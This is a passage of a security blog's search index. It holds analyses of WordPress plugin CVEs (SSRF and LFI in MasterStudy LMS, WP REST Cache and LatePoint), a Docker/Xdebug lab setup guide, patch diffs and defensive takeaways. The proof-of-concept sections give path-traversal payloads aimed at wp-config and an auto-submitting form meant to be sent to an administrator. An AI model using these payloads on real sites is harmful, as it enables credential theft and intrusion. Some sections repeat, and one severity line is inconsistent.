timeout, redirects, and file size. Carefully validate input data and user capabilities. ","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:4:4","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References SSRF (Server Side Request Forgery) — Hacktrick WordPress Essential Blocks for Gutenberg Plugin \u003c= 5.7.1 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#references"},{"categories":["Web"],"collections":null,"content":"A powerful and the most popular content management system (CMS).","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/"},{"categories":["Web"],"collections":null,"content":"Continuing from the previous guide on installing WordPress in a local environment (see here), this post will show you how to set up WordPress with Docker — a modern, flexible, and easily shareable approach. ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:0:0","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#"},{"categories":["Web"],"collections":null,"content":"Why Use Docker? Docker allows you to package the entire WordPress environment (PHP, MySQL, web server, and source code) into independent containers. This brings several key advantages: Environment consistency: Works the same everywhere, eliminating “works on my machine” issues. Easy setup and reset: Spin up or rebuild your environment in just a few commands. Isolation and security: Each container runs independently, avoiding software conflicts. Convenient development and debugging: Enable Xdebug, monitor logs, or tweak PHP settings without affecting your main system. Easy sharing: Just share the docker-compose.yml file — others can launch the exact same setup without manual installation. Docker is an optimal solution for developing, testing, and collaborating on WordPress projects — especially useful for developers, teams, or penetration testers who need a consistent, reproducible environment. ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:1:0","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#why-use-docker"},{"categories":["Web"],"collections":null,"content":"Setup WordPress for Hacker in Docker ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:0","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#setup-wordpress-for-hacker-in-docker"},{"categories":["Web"],"collections":null,"content":"Prerequisites Docker First, install Docker. It’s available on all major operating systems, with installation steps differing slightly per platform. See the official guide: https://www.docker.com/get-started/ Docker Compose Instead of manually starting containers with docker run, use Docker Compose — a tool that defines and manages multiple linked containers using a single configuration file (docker-compose.yml). For WordPress, you’ll need: A MySQL container for the database. A WordPress (PHP + web server) container for the site itself. Manually setting this up involves complex commands and configurations. With Docker Compose, everything is neatly handled in one YAML file: Easy setup: Run docker-compose up -d to get WordPress + MySQL instantly. Easy sharing: Anyone can use your docker-compose.yml to replicate your setup. Easy expansion: Add phpMyAdmin, Nginx, or Xdebug with just a few extra lines. Install instructions: https://docs.docker.com/compose/install/ ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:1","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#prerequisites"},{"categories":["Web"],"collections":null,"content":"Prerequisites Docker First, install Docker. It’s available on all major operating systems, with installation steps differing slightly per platform. See the official guide: https://www.docker.com/get-started/ Docker Compose Instead of manually starting containers with docker run, use Docker Compose — a tool that defines and manages multiple linked containers using a single configuration file (docker-compose.yml). For WordPress, you’ll need: A MySQL container for the database. A WordPress (PHP + web server) container for the site itself. Manually setting this up involves complex commands and configurations. With Docker Compose, everything is neatly handled in one YAML file: Easy setup: Run docker-compose up -d to get WordPress + MySQL instantly. Easy sharing: Anyone can use your docker-compose.yml to replicate your setup. Easy expansion: Add phpMyAdmin, Nginx, or Xdebug with just a few extra lines. Install instructions: https://docs.docker.com/compose/install/ ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:1","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#docker"},{"categories":["Web"],"collections":null,"content":"Prerequisites Docker First, install Docker. It’s available on all major operating systems, with installation steps differing slightly per platform. See the official guide: https://www.docker.com/get-started/ Docker Compose Instead of manually starting containers with docker run, use Docker Compose — a tool that defines and manages multiple linked containers using a single configuration file (docker-compose.yml). For WordPress, you’ll need: A MySQL container for the database. A WordPress (PHP + web server) container for the site itself. Manually setting this up involves complex commands and configurations. With Docker Compose, everything is neatly handled in one YAML file: Easy setup: Run docker-compose up -d to get WordPress + MySQL instantly. Easy sharing: Anyone can use your docker-compose.yml to replicate your setup. Easy expansion: Add phpMyAdmin, Nginx, or Xdebug with just a few extra lines. Install instructions: https://docs.docker.com/compose/install/ ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:1","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#docker-compose"},{"categories":["Web"],"collections":null,"content":"Installing WordPress with Docker Compose and Xdebug This section shows how to install WordPress using Docker Compose, with Xdebug integration for debugging directly in VS Code. This gives you a complete development setup that’s easy to debug and extend. Folder structure: . ├── wordpress ├── docker-compose.yml ├── Dockerfile ├── php.ini └── .vscode └── launch.json ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:2","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#installing-wordpress-with-docker-compose-and-xdebug"},{"categories":["Web"],"collections":null,"content":"Setup Environment Create a new folder to store all configuration files: mkdir wordpress-docker \u0026\u0026 cd wordpress-docker ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:3","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#setup-environment"},{"categories":["Web"],"collections":null,"content":"Create Dockerfile The default WordPress image does not include Xdebug, so we’ll extend it with a Dockerfile. nano Dockerfile Content: FROM wordpress:latest # Install Xdebug RUN pecl install xdebug \u0026\u0026 docker-php-ext-enable xdebug ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:4","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#create-dockerfile"},{"categories":["Web"],"collections":null,"content":"Create docker-compose.yml Now create the file that configures the full environment: nano docker-compose.yml Content: services: db: image: mysql:latest container_name: wp_db restart: always environment: MYSQL_ROOT_PASSWORD: root MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress volumes: - db_data:/var/lib/mysql wordpress: build: . container_name: wp_app depends_on: - db ports: - \"80:80\" restart: always environment: WORDPRESS_DB_HOST: db:3306 WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress WORDPRESS_DB_NAME: wordpress volumes: - ./wordpress:/var/www/html - ./php.ini:/usr/local/etc/php/conf.d/php.ini volumes: db_data: Info The volumes: section handles data persistence and source code synchronization between your host machine and containers. Explanation: db_data:/var/lib/mysql Stores MySQL data persistently — your database won’t be lost if the container is removed. ./wordpress:/var/www/html Syncs WordPress source code between your machine and the container, allowing live editing. ./php.ini:/usr/local/etc/php/conf.d/php.ini Mounts your PHP/Xdebug config file for easy customization without rebuilding the image. ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:5","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#create-docker-composeyml"},{"categories":["Web"],"collections":null,"content":"Create php.ini Enable Xdebug and adjust PHP settings. nano php.ini Content: zend_extension=xdebug xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=172.17.0.1 xdebug.client_port=9003 xdebug.log_level=0 upload_max_filesize = 64M post_max_size = 64M memory_limit = 128M max_execution_time = 300 max_input_time = 300 Explanation: The xdebug.* lines enable debugging in VS Code. The remaining lines increase upload and memory limits for PHP. ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:6","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#create-phpini"},{"categories":["Web"],"collections":null,"content":"Create VS Code Launch Configuration Create the VS Code config file to connect with Xdebug: mkdir .vscode \u0026\u0026 nano .vscode/launch.json Content: ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:7","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#create-vs-code-launch-configuration"},{"categories":["Web"],"collections":null,"content":"Install VS Code Extension Open VS Code → Extensions (Ctrl + Shift + X) → Search and install: PHP Debug (by Xdebug) ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:8","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#install-vs-code-extension"},{"categories":["Web"],"collections":null,"content":"Run Docker Compose Start the environment: docker-compose up -d After the containers start, visit http://localhost to complete the WordPress installation. You can now set breakpoints in your PHP code and debug directly in VS Code. ","date":"2025-10-22","objectID":"/posts/2025-10-22-wordpress-local-and-debugging-docker/:2:9","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/posts/2025-10-22-wordpress-local-and-debugging-docker/#run-docker-compose"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress MasterStudy LMS Plugin.","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The MasterStudy LMS plugin version ≤ 3.5.28 contains a Local File Inclusion (LFI) vulnerability that allows an unauthenticated attacker to control the file parameter in the include/require statement, enabling the inclusion or reading of local files on the server (e.g., configuration files containing credentials). This can lead to sensitive information disclosure and, in certain configurations, remote code execution. CVE ID: CVE-2025-32141 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 3.5.28 Patched Versions: 3.5.29 CVSS severity: Low (8.8) Required Privilege: Contributor Product: WordPress MasterStudy LMS Plugin ","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - MasterStudy LMS: 3.5.28 (vulnerable) and 3.5.29 (patched). Diff tool - Meld or any diff tool to compare the two versions. ","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff Vulnerable Version: \u003c?php add_shortcode( 'stm_lms_courses_categories', 'stm_lms_courses_categories_shortcode' ); function stm_lms_courses_categories_shortcode( $atts ) { $atts = shortcode_atts( array( 'taxonomy' =\u003e '', 'style' =\u003e 'style_1', ), $atts ); ob_start(); STM_LMS_Templates::stm_lms_load_vc_element( 'courses_categories', $atts, $atts['style'] ); return ob_get_clean(); } In the vulnerable version, the shortcode callback stm_lms_courses_categories directly passes the style value from $atts into STM_LMS_Templates::stm_lms_load_vc_element() without sanitization or validation — leading to a potential LFI. Patched Version: \u003c?php add_shortcode( 'stm_lms_courses_categories', 'stm_lms_courses_categories_shortcode' ); function stm_lms_courses_categories_shortcode( $atts, $content = null, $tag = '' ) { $atts = shortcode_atts( array( 'taxonomy' =\u003e '', 'style' =\u003e 'style_1', ), $atts, $tag ); $atts['style'] = basename( sanitize_file_name( $atts['style'] ) ); ob_start(); STM_LMS_Templates::stm_lms_load_vc_element( 'courses_categories', $atts, $atts['style'] ); return ob_get_clean(); } The patch sanitizes $atts['style'] using sanitize_file_name(), removing unsafe characters and preventing LFI. ","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code public static function stm_lms_load_vc_element( $__template, $__vars = array(), $__template_name = '', $custom_path = '' ) { extract( $__vars ); // phpcs:ignore WordPress.PHP.DontExtract $element = self::stm_lms_locate_vc_element( $__template, $__template_name, $custom_path ); if ( ! file_exists( $element ) \u0026\u0026 strpos( $__template_name, 'style_' ) !== false ) { $element = str_replace( $__template_name, 'style_1', $element ); } if ( file_exists( $element ) ) { include $element; } else { echo esc_html__( 'Element not found in', 'masterstudy-lms-learning-management-system' ); echo esc_html( ' ' . $element ); } } The include() statement uses $element returned from stm_lms_locate_vc_element(), which is influenced by $__template_name (the style parameter from the shortcode). Without validation, an attacker can manipulate it to include arbitrary files, leading to LFI. public static function stm_lms_locate_vc_element( $templates, $template_name = '', $custom_path = '' ) { $located = false; foreach ( (array) $templates as $template ) { $folder = $template; if ( ! empty( $template_name ) ) { $template = $template_name; } if ( substr( $template, -4 ) !== '.php' ) { $template .= '.php'; } if ( empty( $custom_path ) ) { $located = locate_template( 'partials/vc_parts/' . $folder . '/' . $template ); if ( ! ( $located ) ) { $located = STM_LMS_PATH . '/includes/shortcodes/partials/' . $folder . '/' . $template; } } else { $located = locate_template( $custom_path ); if ( ! ( $located ) ) { $located = STM_LMS_PATH . '/' . $custom_path . '.php'; } } if ( file_exists( $template_name ) ) { break; } } return apply_filters( 'stm_lms_locate_vc_element', $located, $templates ); } The stm_lms_locate_vc_element() function determines and returns the path of the template file (.php). If $template_name is provided, it overrides the default template name and ensures it ends with .php. The resulting file path becomes STM_LMS_PATH/includes/shortcodes/partials/{folder}/{template}.php. For example, with style=payload, it returns: /srv/www/wordpress/wp-content/plugins/masterstudy-lms-learning-management-system/_core/includes/shortcodes/partials/courses_categories/payload.php ","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a post with a shortcode that includes an LFI payload in the style attribute: POST /wp-json/wp/v2/posts/260?_locale=user HTTP/1.1 Host: localhost {\"id\":260,\"content\":\"\u003c!-- wp:shortcode --\u003e\\n[stm_lms_courses_categories taxonomy=x style=../../../../../../../../wp-config]\\n\u003c!-- /wp:shortcode --\u003e\\n\\n\u003c!-- wp:paragraph --\u003e\\n\u003cp\u003e\u003c/p\u003e\\n\u003c!-- /wp:paragraph --\u003e\"} Result: The debugger hits wp-config.php. Successful LFI result ","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion Versions ≤ 3.5.28 of MasterStudy LMS are vulnerable to LFI via the style parameter in the shortcode due to unsanitized input used in an include statement. The patch in 3.5.29 sanitizes this input using sanitize_file_name() and basename(), preventing unauthorized file access. ","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Never concatenate user input directly into file paths. Always sanitize or whitelist values before using them in include or require. Validate the resolved path to ensure it stays within the intended directory. Update to v3.5.29 to eliminate this LFI vulnerability. ","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References File Inclusion/Path traversal — Hacktrick WordPress MasterStudy LMS Plugin \u003c= 3.5.28 is vulnerable to Local File Inclusion ","date":"2025-10-21","objectID":"/posts/2025-10-21-cve-2025-32141/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32141 Analysis \u0026 POC","uri":"/posts/2025-10-21-cve-2025-32141/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress WP REST Cache Plugin.","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The WP REST Cache plugin version ≤ 2025.1.0 contains a Local File Inclusion vulnerability that allows an unauthenticated attacker to control the file parameter used in include/require, thereby injecting or reading local files on the server (e.g., configuration files containing credentials), leading to leakage of sensitive information and, in some configurations, possible code execution. CVE ID: CVE-2025-52716 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 2025.1.0 Patched Versions: 2025.1.1 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress WP REST Cache Plugin ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WP REST Cache: 2025.1.0 (vulnerable) and 2025.1.1 (patched). Diff tool - Meld or any diff/comparison tool to inspect differences between the two versions. ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff Vulnerable version: public function settings_page() { $this-\u003esettings_panels = apply_filters( 'wp_rest_cache/settings_panels', $this-\u003esettings_panels ); $sub = filter_input( INPUT_GET, 'sub', FILTER_SANITIZE_FULL_SPECIAL_CHARS ); if ( empty( $sub ) ) { $sub = 'settings'; } include_once __DIR__ . '/partials/header.php'; if ( isset( $this-\u003esettings_panels[ $sub ]['template'] ) ) { include_once $this-\u003esettings_panels[ $sub ]['template']; } elseif ( file_exists( __DIR__ . '/partials/sub-' . $sub . '.php' ) ) { include_once __DIR__ . '/partials/sub-' . $sub . '.php'; } else { include_once __DIR__ . '/partials/sub-settings.php'; } } In the vulnerable version, $sub is the value returned by filter_input() taken from the GET parameter (?sub=...) in the URL using the filter FILTER_SANITIZE_FULL_SPECIAL_CHARS, which escapes \"\u003c\u003e\u0026 and characters with ASCII values below 32. This filter does not remove . (46) or / (47). $sub is concatenated into a string with the '.php' suffix and then include_onced without any protection against LFI. Patch: public function settings_page() { $this-\u003esettings_panels = apply_filters( 'wp_rest_cache/settings_panels', $this-\u003esettings_panels ); $sub = filter_input( INPUT_GET, 'sub', FILTER_SANITIZE_FULL_SPECIAL_CHARS ); if ( empty( $sub ) ) { $sub = 'settings'; } $potential_sub_file = __DIR__ . '/partials/sub-' . $sub . '.php'; if ( dirname( $potential_sub_file ) !== __DIR__ . '/partials' ) { $sub = 'settings'; } include_once __DIR__ . '/partials/header.php'; if ( isset( $this-\u003esettings_panels[ $sub ]['template'] ) ) { include_once $this-\u003esettings_panels[ $sub ]['template']; } elseif ( file_exists( __DIR__ . '/partials/sub-' . $sub . '.php' ) ) { include_once __DIR__ . '/partials/sub-' . $sub . '.php'; } else { include_once __DIR__ . '/partials/sub-settings.php'; } } The patch adds a check on the file location before include, ensuring the file to be loaded is located within the partials directory. If a path outside that directory is detected (e.g., due to ../), the plugin falls back to a safe default file. This eliminates the LFI vulnerability. ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code settings_page() is registered as the submenu callback: add_submenu_page( 'options-general.php', 'WP REST Cache', 'WP REST Cache', $capability, 'wp-rest-cache', [ $this, 'settings_page', ] ); So when the endpoint GET /wp-admin/options-general.php?page=wp-rest-cache HTTP/1.1 is accessed, settings_page() is invoked. ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Step 1 Create a web page with a form that automatically sends a request with the LFI payload \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://localhost:80//wp-admin/options-general.php\" method=\"get\"\u003e \u003cinput type=\"text\" name=\"page\" value=\"wp-rest-cache\"\u003e \u003cinput type=\"text\" name=\"sub\" value=\"/../../../../../../wp-cofnig\"\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit() \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Step 2 Send the link to an admin or a privileged user Warning This vulnerability can only be exploited on Windows, because file_exists() handles paths differently between operating systems. On Linux, if the path includes a non-existent directory, the function returns false. On Windows, the same path may return true, allowing the condition check to be bypassed and the vulnerability to be triggered. ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Step 1 Create a web page with a form that automatically sends a request with the LFI payload \u003c!DOCTYPE html\u003e Document Step 2 Send the link to an admin or a privileged user Warning This vulnerability can only be exploited on Windows, because file_exists() handles paths differently between operating systems. On Linux, if the path includes a non-existent directory, the function returns false. On Windows, the same path may return true, allowing the condition check to be bypassed and the vulnerability to be triggered. ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#step-1"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Step 1 Create a web page with a form that automatically sends a request with the LFI payload \u003c!DOCTYPE html\u003e Document Step 2 Send the link to an admin or a privileged user Warning This vulnerability can only be exploited on Windows, because file_exists() handles paths differently between operating systems. On Linux, if the path includes a non-existent directory, the function returns false. On Windows, the same path may return true, allowing the condition check to be bypassed and the vulnerability to be triggered. ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#step-2"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion WP REST Cache versions ≤ 2025.1.0 allow Local File Inclusion via the sub parameter. The patch in 2025.1.1 fixes the issue by validating the file location before including it—ensuring files are only loaded if they reside in the partials directory—thereby preventing path traversal/LFI. ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Concatenating request data directly into file paths risks LFI. Always validate the real/resolved file location (absolute path) before including. Restrict allowed files by comparing against an intended directory (whitelist) — this is more effective than merely sanitizing characters. Test on multiple platforms (Windows/Linux) since file-handling behavior can differ. ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References File Inclusion/Path traversal — Hacktrick WordPress WP REST Cache Plugin \u003c= 2025.1.0 is vulnerable to Local File Inclusion ","date":"2025-10-20","objectID":"/posts/2025-10-20-cve-2025-52716/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-52716 Analysis \u0026 POC","uri":"/posts/2025-10-20-cve-2025-52716/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress LatePoint Plugin.","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info Plugin LatePoint version ≤ 5.1.93 contains a Local File Inclusion vulnerability that allows unauthenticated attackers to control the file parameter in the include/require statement, thereby injecting or reading local files on the server (e.g., configuration files containing credentials), leading to sensitive information disclosure and, in some configurations, potential code execution. CVE ID: CVE-2025-6715 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 5.1.93 Patched Versions: 5.1.94 CVSS severity: High (8.1) Required Privilege: Unauthenticated Product: WordPress LatePoint Plugin ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - LatePoint: 5.1.93 (vulnerable) and 5.1.94 (patched). Diff tool - Meld or any diff tool to compare and inspect differences between versions. ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-19","objectID":"/posts/2025-10-19-cve-2025-6715/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-6715 Analysis \u0026 POC","uri":"/posts/2025-10-19-cve-2025-6715/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff Vulnerable version: function render($view, $layout = 'none', $extra_vars = array()){ $this-\u003evars['route_name'] = $this-\u003eroute_name; extract($extra_vars); extract($this-\u003evars); ob_start(); if($layout != 'none'){ // rendering layout, view variable will be passed and used in layout file include LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $this-\u003eadd_extension($layout, '.php'); }else{ include $this-\u003eadd_extension($view, '.php'); } $response_html = ob_get_clean(); return $response_html; } In the vulnerable version, the render() function appends .php to $layout and directly includes it without validation, leading to Local File Inclusion (LFI) if $layout is controlled by user input. Patched version: function render($view, $layout = 'none', $extra_vars = array()){ $this-\u003evars['route_name'] = $this-\u003eroute_name; extract($extra_vars); extract($this-\u003evars); ob_start(); if($layout != 'none'){ $layout_path = $this-\u003eget_safe_layout_path($layout); // rendering layout, view variable will be passed and used in layout file if($layout_path){ include $layout_path; }else{ __('Invalid layout', 'latepoint'); } }else{ include $this-\u003eadd_extension($view, '.php'); } $response_html = ob_get_clean(); return $response_html; } private function get_safe_layout_path($layout) { // 1. Remove any path separators and null bytes $layout = str_replace(['/', '\\\\', \"\\0\"], '', $layout); // 